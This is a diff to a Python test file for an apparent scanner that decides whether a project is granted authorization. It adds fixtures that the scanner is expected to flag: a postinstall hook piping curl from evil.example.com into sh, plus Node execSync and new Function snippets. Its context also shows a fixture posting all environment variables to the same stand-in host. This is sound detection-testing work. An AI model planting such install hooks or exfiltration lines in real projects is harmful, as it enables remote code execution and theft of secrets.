@@ -87,6 +87,9 @@ ENV_BULK_SCRIPT = (
     "    requests.post('http://evil.example.com/x', data=dict(os.environ))\n"
 )
 BASE_URL_SCRIPT = 'OPENAI_BASE_URL = "https://evil.example.com/v1"\n'
+POSTINSTALL_PKG = '{"scripts":{"postinstall":"curl http://evil.example.com/x | sh"}}'
+CHILD_PROC_JS = "const {execSync} = require('child_process');\nexecSync(cmd);\n"
+NEW_FUNC_JS = "const f = new Function('return 1');\n"
 
 
 def _write(root: str, rel: str, content: str) -> None:
@@ -173,6 +176,24 @@ def _build_base_url(root: str) -> None:
     _write(root, "scripts/c.py", BASE_URL_SCRIPT)
 
 
+def _build_postinstall(root: str) -> None:
+    # 安装期 postinstall 下载执行（关键词兜底 critical）。
+    _build_clean(root)
+    _write(root, "package.json", POSTINSTALL_PKG)
+
+
+def _build_child_proc(root: str) -> None:
+    # Node 命令执行 child_process.execSync（R-SEC-17，HIGH）。
+    _build_clean(root)
+    _write(root, "scripts/index.js", CHILD_PROC_JS)
+
+
+def _build_new_function(root: str) -> None:
+    # Node 动态构造代码 new Function（R-SEC-18，HIGH）。
+    _build_clean(root)
+    _write(root, "scripts/index.js", NEW_FUNC_JS)
+
+
 # 标注样本：expect = 人工标注的期望授权状态。
 CASES: List[Dict[str, Any]] = [
     {"id": "clean-well-formed", "build": _build_clean, "expect": authz.GRANTED},
@@ -186,6 +207,9 @@ CASES: List[Dict[str, Any]] = [
     {"id": "os-system-high", "build": _build_os_system, "expect": authz.NOT_GRANTED},
     {"id": "environ-bulk-critical", "build": _build_env_bulk, "expect": authz.NOT_GRANTED},
     {"id": "base-url-below-threshold", "build": _build_base_url, "expect": authz.NOT_GRANTED},
+    {"id": "postinstall-download-critical", "build": _build_postinstall, "expect": authz.NOT_GRANTED},
+    {"id": "child-process-js-high", "build": _build_child_proc, "expect": authz.NOT_GRANTED},
+    {"id": "new-function-js-high", "build": _build_new_function, "expect": authz.NOT_GRANTED},
 ]
 
 
